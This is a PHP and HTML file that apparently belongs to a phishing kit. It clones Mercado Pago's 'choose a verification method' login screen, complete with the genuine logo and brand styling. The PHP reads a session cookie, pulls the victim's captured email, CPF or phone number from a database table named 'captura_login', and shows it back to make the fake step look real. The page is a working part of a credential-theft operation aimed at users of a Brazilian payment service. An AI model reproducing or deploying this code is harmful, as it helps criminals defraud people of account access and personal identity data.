<?php
// Inicia a sessão
session_start();

// Inclui a conexão com o banco de dados
require 'db.php';

// Prepara variáveis com valores padrão
$identificador_label = 'Não identificado';
$identificador_puro = '';
$tipo_identificador = '';

// 1. Verifica se o cookie do cliente existe
if (isset($_COOKIE['identificador_cliente'])) {
    $session_id = $_COOKIE['identificador_cliente'];

    try {
        // 2. Busca o identificador mais recente para esta sessão
        $stmt = $pdo->prepare(
            "SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
        );
        $stmt->execute([$session_id]);
        $resultado = $stmt->fetch(PDO::FETCH_ASSOC);

        // 3. Se encontrou, formata os dados para exibição
        if ($resultado) {
            $identificador_puro = $resultado['identificador'];
            $numeros_identificador = preg_replace('/\D/', '', $identificador_puro);

            // Formata o label e define o tipo
            if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
                $tipo_identificador = 'email';
                $identificador_label = 'E-mail: ' . htmlspecialchars($identificador_puro);
            } elseif (strlen($numeros_identificador) === 11) {
                $tipo_identificador = 'cpf';
                $identificador_label = 'CPF: ' . htmlspecialchars($identificador_puro);
            } else {
                $tipo_identificador = 'telefone';
                $identificador_label = 'Telefone: ' . htmlspecialchars($identificador_puro);
            }
        } else {
            header('Location: index.php');
            exit;
        }
    } catch (PDOException $e) {
        die("Erro ao consultar o banco de dados: " . $e->getMessage());
    }
} else {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escolha um método de verificação</title>
    <style>
        :root {
            --andes-color-yellow-500: #ffe600;
            --andes-color-blue-100: rgba(52, 131, 250, 0.1);
            --andes-color-blue-500: #3483fa;
            --andes-text-color-primary: #333;
            --andes-text-color-secondary: #555;
            --andes-text-color-link: var(--andes-color-blue-500);
            --andes-background-color-primary: #fff;
            --andes-background-color-secondary: #f5f5f5;
            --andes-border-color-secondary: #ededed;
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-secondary); }
        .main-header { background-color: var(--andes-color-yellow-500); padding: 0 48px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start; }
        .main-header img { height: 37px; vertical-align: middle; }
        .main-content { padding: 80px 24px; flex-grow: 1; }
        .content-wrapper { max-width: 880px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
        .left-column { display: flex; flex-direction: column; width: 320px; flex-shrink: 0; margin-right: 64px; }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
        .main-title { font-size: 28px; font-weight: 400; color: var(--andes-text-color-primary); line-height: 1.25; margin: 0; }
        .user-identifier-box { display: flex; align-items: center; gap: 16px; border: 1px solid rgba(0, 0, 0, .1); border-radius: 1.5625rem; padding: 8px 12px; margin-top: 32px; width: fit-content; }
        .icon-wrapper { width: 32px; height: 32px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; }
        .user-identifier-box .icon-wrapper svg { color: var(--andes-color-blue-500); }
        .identifier-text-block { display: flex; flex-direction: column; }
        .identifier-text-block .cpf-text { font-size: 14px; font-weight: 400; color: var(--andes-text-color-primary); }
        .identifier-text-block .change-account-link { font-size: 13px; color: var(--andes-text-color-link); text-decoration: none; margin-top: 2px; }
        .identifier-text-block .change-account-link:hover { text-decoration: underline; }
        .help-link { display: block; margin-top: 24px; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
        .help-link:hover { text-decoration: underline; }
        .verification-card { width: 100%; max-width: 480px; background-color: var(--andes-background-color-primary); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 8px 0; box-sizing: border-box; }
        .verification-option { display: flex; align-items: center; gap: 16px; padding: 16px 24px; text-decoration: none; color: inherit; transition: background-color 0.2s; }
        .verification-option:hover { background-color: var(--andes-background-color-secondary); }
        .verification-option .icon-container { width: 40px; height: 40px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .verification-option .icon-container svg { color: var(--andes-color-blue-500); }
        .verification-option .icon-container svg path { fill: currentColor; }
        .verification-option .icon-container svg .channel-icon__shape--stroked { stroke: currentColor; stroke-width: 1.5; fill: none; }
        .verification-option .text-content { flex-grow: 1; }
        .verification-option .text-content h3 { margin: 0 0 4px 0; font-size: 16px; font-weight: 500; color: var(--andes-text-color-primary); }
        .verification-option .text-content p { margin: 0; font-size: 14px; color: var(--andes-text-color-secondary); }
        .verification-option .chevron-icon { margin-left: auto; }
        .verification-option .chevron-icon polyline { stroke: var(--andes-color-blue-500); }
        .final-separator { height: 1px; background-color: var(--andes-border-color-secondary); margin: 8px 24px; }
        .cant-login-link { display: block; text-align: left; color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; padding: 16px 24px 24px 24px; }
        .cant-login-link:hover { text-decoration: underline; }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Escolha um método de verificação para iniciar sessão</h1>
                <div class="user-identifier-box">
                    <div class="icon-wrapper">
                        <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z"></path><path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z"></path></svg>
                    </div>
                    <div class="identifier-text-block">
                        <span class="cpf-text"><?php echo $identificador_label; ?></span>
                        <a href="/index.php" class="change-account-link">Trocar conta</a>
                    </div>
                </div>
                <a href="#" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="verification-card">
                </div>
        </div>
    </main>

</body>
</html>